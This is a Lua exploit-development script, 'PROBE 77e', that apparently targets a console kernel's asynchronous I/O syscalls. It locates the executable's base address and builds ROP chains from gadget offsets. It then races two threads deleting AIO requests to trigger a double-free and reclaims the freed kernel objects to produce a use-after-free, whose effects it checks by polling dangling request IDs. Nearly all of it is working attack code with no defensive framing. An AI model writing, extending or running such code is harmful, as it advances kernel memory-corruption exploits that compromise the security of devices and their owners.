-- CRASH_CLASS: HIGH
-- PROBE 77e: prolapse same-type reclaim via AIO resubmit
--
-- 77d proved RTHDR can't cross UMA zones. The double-free puts an AIO
-- object on the freelist twice. Strategy:
--   1. Submit 16 AIO, race-delete (double-free some)
--   2. Immediately submit NEW AIO requests to reclaim freed slots
--   3. The double-freed object is allocated to TWO new requests
--   4. Delete one → the other's kernel object is freed while still "alive"
--   5. Submit more → reclaim the freed-while-alive object with new data
--   6. Poll/wait the dangling request → read stale/new data = overlap proof
--
-- The key insight: after double-free, two new IDs point to the same
-- kernel object. Deleting ID_X frees the shared object. ID_Y still
-- points to freed memory. Polling ID_Y reads freed zone data.

print("=== PROBE 77e: SAME-TYPE AIO RECLAIM ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eboot=" .. fmt(eb))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- socketpair for AIO read targets (so requests don't complete on /dev/zero)
local svbuf = memory.alloc(16)
pcall(function() mk(135)(uint64(1), uint64(1), uint64(0), svbuf) end)
local sv0 = rd(N(svbuf)) or -1
local sv1 = rd(N(svbuf) + 4) or -1
print(string.format("socketpair fds: %d, %d", sv0, sv1))

-- Also /dev/zero for completed reads
local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("/dev/zero fd=" .. fd_zero)

pcall(function() mk(670)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)) end)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)

-- Submit AIO read on socketpair (stays PENDING — won't complete until data written)
local function submit_pending()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))  -- read 16 bytes
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, sv0); wd(N(reqs) + 0x24, 0)  -- read from socketpair[0]
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

-- Submit AIO read on /dev/zero (completes immediately)
local function submit_completing()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_id(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function delete_id(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

-- Race buffers
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)
local marker_A = memory.alloc(8)
local marker_B = memory.alloc(8)

print("")
print("[1] RACE + SAME-TYPE RECLAIM (10 iters)")

local ITERS = 30
local total_doubles = 0
local total_anomalies = 0
local total_kptrs = 0

for iter = 1, ITERS do
    if not alive() then print(string.format("  iter %d: DEAD", iter)); break end

    -- Submit BATCH completing AIO requests (on /dev/zero, complete immediately)
    -- This matches the 65l pattern that reliably hits the double-free
    local ids = {}
    for i = 1, BATCH do
        local id = submit_completing()
        if id ~= 0 then
            poll_id(id)  -- poll to move to completed state
            ids[#ids + 1] = id
        end
    end
    if #ids < 4 then print("  too few IDs"); break end
    local count = #ids

    -- Race: two children both call 662
    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end
    wq(N(marker_A), uint64(0)); wq(N(marker_B), uint64(0))

    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A); local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rax); emA(uint64(0x41414141))
    emA(g_pop_rdi); emA(uint64(N(marker_A))); emA(g_mov_m_rax)
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B); local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rax); emB(uint64(0x42424242))
    emB(g_pop_rdi); emB(uint64(N(marker_B))); emB(g_mov_m_rax)
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)
    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Check which slots were double-deleted
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        print(string.format("  iter %d: *** %d DOUBLE DELETES ***", iter, doubles))

        -- RECLAIM: submit new AIO requests to fill the freed slots
        -- Submit 2× doubles worth of new requests to grab both copies
        local reclaim_ids = {}
        local reclaim_n = doubles * 4 + 8  -- overshoot to ensure reclaim
        for r = 1, reclaim_n do
            local id = submit_completing()
            if id ~= 0 then reclaim_ids[#reclaim_ids + 1] = id end
        end
        print(string.format("    reclaimed %d new IDs", #reclaim_ids))

        -- Now poll ALL reclaimed IDs and look for anomalous states
        for r = 1, #reclaim_ids do
            local st = poll_id(reclaim_ids[r])
            -- Normal completed = 3, normal states are 1-4
            -- Anything else = reading stale/corrupted data
            if st ~= 3 and st ~= 0x80020003 and st ~= 0xDEAD then
                total_anomalies = total_anomalies + 1
                print(string.format("    ANOMALY id=0x%X poll=0x%08X", reclaim_ids[r], st))
            end
        end

        -- Delete one reclaimed ID, then poll its neighbors for stale data
        if #reclaim_ids >= 4 then
            local victim = reclaim_ids[1]
            local dvs = delete_id(victim)
            print(string.format("    deleted victim 0x%X (st=0x%X)", victim, dvs))

            -- Submit replacement to overwrite the freed slot
            local replace_id = submit_completing()

            -- Poll the remaining reclaimed IDs — if any shared the freed
            -- object, they now point to the replacement's data
            for r = 2, math.min(#reclaim_ids, 20) do
                local st2 = poll_id(reclaim_ids[r])
                if st2 ~= 3 and st2 ~= 0x80020003 and st2 ~= 0xDEAD then
                    total_anomalies = total_anomalies + 1
                    print(string.format("    POST-DELETE ANOMALY id=0x%X poll=0x%08X", reclaim_ids[r], st2))
                end
            end

            -- Also try polling the DELETED victim — if slot was reused,
            -- the ID may now resolve to the replacement object
            local ghost = poll_id(victim)
            if ghost ~= 0x80020003 and ghost ~= 0xDEAD then
                total_anomalies = total_anomalies + 1
                print(string.format("    GHOST id=0x%X poll=0x%08X (deleted ID still resolves!)",
                    victim, ghost))
            end

            -- Clean up replacement
            if replace_id ~= 0 then delete_id(replace_id) end
        end

        -- Clean up remaining reclaimed IDs
        for r = 2, #reclaim_ids do
            delete_id(reclaim_ids[r])
        end
    else
        if iter <= 3 or iter == ITERS then
            print(string.format("  iter %d: no double", iter))
        end
    end
end

print("")
print("[SUMMARY]")
print(string.format("  race iters:   %d", ITERS))
print(string.format("  double frees: %d", total_doubles))
print(string.format("  anomalies:    %d", total_anomalies))
print(string.format("  kernel ptrs:  %d", total_kptrs))
print(string.format("  process:      %s", alive() and "ALIVE" or "DEAD"))

if total_anomalies > 0 then
    print("")
    print("*** ANOMALOUS POLL STATES DETECTED ***")
    print("Same-type reclaim produced unexpected data in AIO readback.")
    print("This confirms the double-freed slot was reused by new requests.")
end

print("")
print("=== 77e COMPLETE ===")
